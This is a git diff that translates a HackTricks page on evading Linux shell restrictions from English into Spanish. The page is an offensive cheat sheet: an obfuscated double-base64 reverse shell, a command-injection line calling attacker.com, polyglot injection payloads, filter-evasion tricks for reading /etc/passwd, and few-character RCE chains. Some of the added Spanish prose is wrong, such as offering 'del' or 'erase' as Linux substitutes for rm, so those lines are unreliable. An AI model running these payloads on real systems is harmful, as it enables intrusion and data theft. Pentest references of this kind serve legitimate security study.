@@ -1,37 +1,34 @@
-# Bypass Linux Shell Restrictions
+# Saltar Restricciones de la Shell de Linux
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Usa [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Common Limitations Bypasses
+## Saltos Comunes de Limitaciones
 
-### Reverse Shell
-
+### Shell Inversa
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-
-### Short Rev shell
-
+### Rev shell corta
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -39,9 +36,21 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
+### Saltar rutas y palabras prohibidas
 
-### Bypass Paths and forbidden words
+---
 
+En algunos casos, el acceso a ciertas rutas o palabras está prohibido por el sistema. Sin embargo, hay formas de saltar estas restricciones.
+
+#### Saltar rutas prohibidas
+
+Si se intenta acceder a una ruta prohibida, se puede intentar saltar la restricción utilizando una ruta relativa. Por ejemplo, si `/home/user` está prohibido, se puede intentar acceder a `../user` desde otra ruta permitida.
+
+#### Saltar palabras prohibidas
+
+Si se intenta ejecutar un comando que contiene una palabra prohibida, se puede intentar utilizar un sinónimo o una abreviatura de la palabra. Por ejemplo, si `rm` está prohibido, se puede intentar utilizar `del` o `erase` en su lugar.
+
+También se puede intentar utilizar una ruta absoluta para el comando, en lugar de simplemente escribir el nombre del comando. Por ejemplo, en lugar de escribir `rm archivo`, se puede intentar escribir `/bin/rm archivo`.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -96,9 +105,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-
-### Bypass forbidden spaces
-
+### Saltar espacios prohibidos
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -131,22 +138,16 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-
-### Bypass backslash and slash
-
+### Saltar la barra invertida y la barra diagonal
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-
-### Bypass pipes
-
+### Saltar tuberías
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-
-### Bypass with hex encoding
-
+### Bypass mediante codificación hexadecimal
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -156,36 +157,48 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-
-### Bypass IPs
-
+### Saltar IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-
-### Time based data exfiltration
-
+### Exfiltración de datos basada en tiempo
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
+### Obteniendo caracteres de variables de entorno
 
-### Getting chars from Env Variables
+Para obtener caracteres de variables de entorno, podemos utilizar la expansión de variables de Bash. Por ejemplo, si queremos obtener el primer carácter de la variable de entorno `MY_VAR`, podemos hacer lo siguiente:
 
+```bash
+echo ${MY_VAR:0:1}
+```
+
+Esto imprimirá el primer carácter de `MY_VAR`. De manera similar, si queremos obtener los primeros tres caracteres, podemos hacer lo siguiente:
+
+```bash
+echo ${MY_VAR:0:3}
+```
+
+También podemos obtener los últimos caracteres de una variable de entorno utilizando un índice negativo. Por ejemplo, si queremos obtener los últimos dos caracteres de `MY_VAR`, podemos hacer lo siguiente:
+
+```bash
+echo ${MY_VAR: -2}
+```
+
+Tenga en cuenta que hay un espacio después del `:` en la expresión `${MY_VAR: -2}`. Esto es necesario para indicar que estamos utilizando un índice negativo.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
+### Exfiltración de datos DNS
 
-### DNS data exfiltration
+Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+### Funciones integradas
 
-### Builtins
-
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
-First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
-
+En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones integradas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones integradas**, por lo que debes **conocer todas tus opciones** para intentar evadir la cárcel. Idea de [**devploit**](https://twitter.com/devploit).\
+En primer lugar, verifica todas las [**funciones integradas de shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Luego, aquí tienes algunas **recomendaciones**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -237,30 +250,24 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-
-### Polyglot command injection
-
+### Inyección de comandos políglota
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-
-### Bypass potential regexes
-
+### Saltar posibles expresiones regulares
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-
 ### Bashfuscator
 
+Bashfuscator es una herramienta que permite ofuscar código Bash para evitar la detección de restricciones de Bash. La herramienta utiliza técnicas de ofuscación como la eliminación de espacios en blanco, la sustitución de caracteres y la codificación de cadenas. Esto puede ser útil para evadir restricciones de Bash en sistemas comprometidos o para ocultar comandos maliciosos en scripts Bash.
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-
-### RCE with 5 chars
-
+### RCE con 5 caracteres
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -307,9 +314,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link 
 ## to it in the current folder
 ```
-
-### RCE with 4 chars
-
+### RCE con 4 caracteres
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -344,22 +349,21 @@ ln /f*
 'sh x'
 'sh g'
 ```
+## Bypass de Restricciones de Solo Lectura/Noexec
 
-## Read-Only/Noexec Bypass
-
-If you are inside a filesystem with the **read-only and noexec protections** there are still ways to **execute arbitrary binaries**. One of them is by the use of **DDexec**, yo can find an explanation of the technique in:
+Si te encuentras dentro de un sistema de archivos con protecciones de **solo lectura y noexec**, todavía hay formas de **ejecutar binarios arbitrarios**. Una de ellas es mediante el uso de **DDexec**, puedes encontrar una explicación de la técnica en:
 
 {% content-ref url="../bypass-linux-shell-restrictions/ddexec.md" %}
 [ddexec.md](../bypass-linux-shell-restrictions/ddexec.md)
 {% endcontent-ref %}
 
-## Chroot & other Jails Bypass
+## Bypass de Chroot y otras Jaulas
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## References & More
+## Referencias y Más
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
@@ -369,8 +373,8 @@ If you are inside a filesystem with the **read-only and noexec protections** the
 ![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Usa [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
+Obtén acceso hoy mismo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -378,10 +382,10 @@ Get Access Today:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
